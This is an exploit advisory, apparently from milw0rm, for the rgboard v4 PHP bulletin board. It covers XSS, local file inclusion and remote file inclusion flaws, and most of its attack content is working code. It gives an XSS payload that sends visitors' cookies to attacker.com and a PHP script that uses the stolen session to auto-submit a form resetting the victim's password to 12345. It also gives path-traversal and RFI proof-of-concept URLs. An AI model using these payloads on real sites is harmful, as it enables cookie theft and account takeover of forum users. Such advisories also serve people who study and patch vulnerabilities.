<html><head><title>rgboard v4 5p1 (07.07.27) Multiple Remote Vulnerabilities</title></head><pre>rgboard v4 5p1 (07.07.27) Multiple Vulnerability
bY make0day@gmail.com

/*************************

rgboard (VERSION v4 (07.07.27))is widely used bulletin board system of Korea.
It is freely available for all platforms that supports PHP and MySQL.
But I find a XSS vuln ,LFI vuln and RFI vuln.
I attached a exploit that makes password = 12345 (who reads xss post).
Here is the details:

**************************/
TEST ON VERSION rgboard v4 (07.07.27)
Download : http://v4.rgboard.com/
/***************************
XSS Vulnerability

/wrtie.php

...

$bd_content = rg_conv_text($bd_content,$bd_html); //You have to check 'html use'.

*************************/

poc:

Inject XSS tag : 
&lt;img src = &quot;http://attacker.com&quot; onError=&quot;window.location='http://attacker.com/c.php?c='+document.cookie+'&amp;l='+window.location&quot;&gt;Hi there! :)

/rghunter.php - Makes password as 12345

&lt;?php
  extract($_GET);
  
  $url = eregi_replace(&quot;http://&quot;,&quot;&quot;,$l);

  $chk = 0;

  for($i = 0; $i &lt; strlen($url); $i++)
  {
	if($url[$i] == '/')
        {
		$chk = $i;
	}
  }
  for($i = $chk; $i &lt; strlen($url); $i++)
  {
  	$url[$i] = &quot;&quot;;
  }

  $url = $url.&quot;/../rg4_member/modify.php&quot;;
  setcookie($c);
?&gt;

&lt;form action = &quot;http://&lt;?=$url ?&gt;?&quot; method = &quot;post&quot; name = &quot;member_info&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;form_mode&quot; value=&quot;member_modify_ok&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;ret_url&quot; value=&quot;../main/index.php&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;mb_pass&quot; value=&quot;12345&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;mb_pass1&quot; value=&quot;12345&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;mb_nick&quot; value=&quot;hacked&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;mb_email&quot; value=&quot;attacker@attack.com&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;mb_tel11&quot; value=&quot;062&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;mb_tel12&quot; value=&quot;1234&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;mb_tel13&quot; value=&quot;1234&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;mb_tel21&quot; value=&quot;010&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;mb_tel22&quot; value=&quot;123&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;mb_tel23&quot; value=&quot;1234&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;mb_signature&quot; value=&quot;hacked&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;mb_introduce&quot; value=&quot;hacked&quot;&gt;
&lt;/form&gt;
&lt;script&gt;
document.member_info.submit();
&lt;/script&gt;

/***************************
Local File Inclusion Vulnerability

/_footer.php

	if(file_exists($skin_path.&quot;footer.php&quot;)) include($skin_path.&quot;footer.php&quot;); //File inclusion

*************************/

poc:

//yeah, there is a problem.. file_exists()!
//How can we bypass it? I don`t know :)
//If we have account in same server with target, we can attack his board easily
//Here is the example :

http://attacker.com/RGboard/rg4_board/_footer.php?skin_path=../../../../../../tmp/


/tmp/footer.php
&lt;?
$d = dir(&quot;/tmp&quot;);
echo &quot;Handle: &quot; . $d-&gt;handle . &quot;\n&quot;;
echo &quot;Path: &quot; . $d-&gt;path . &quot;\n&quot;;
while (false !== ($entry = $d-&gt;read())) {
   echo $entry.&quot;\n&quot;;
}
$d-&gt;close();
?&gt;

//Yeah, It is good, But when we don`t account in that server, How we can beat target?
//We can find a clue from php.net
//On windows, use //computername/share/filename or \\computername\share\filename to check files on network shares.
//As of PHP 5.0.0, this function can also be used with some URL wrappers. Refer to List of Supported Protocols/Wrappers
//for a listing of which wrappers support stat() family of functionality.
//Do you find clue too? :-O
 

/***************************
Remote File Inclusion Vulnerability

/footer.php

		&lt;/td&gt;
	&lt;/tr&gt;
&lt;/table&gt;
&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;
  &lt;tr&gt;

...

include($_path['counter'].&quot;rg_counter.php&quot;); ?&gt;	//File inclusion

*************************/

poc:

http://test.com/RGboard/include/footer.php?_path[counter]=[RFI]

# milw0rm.com [2009-02-04]</pre></html>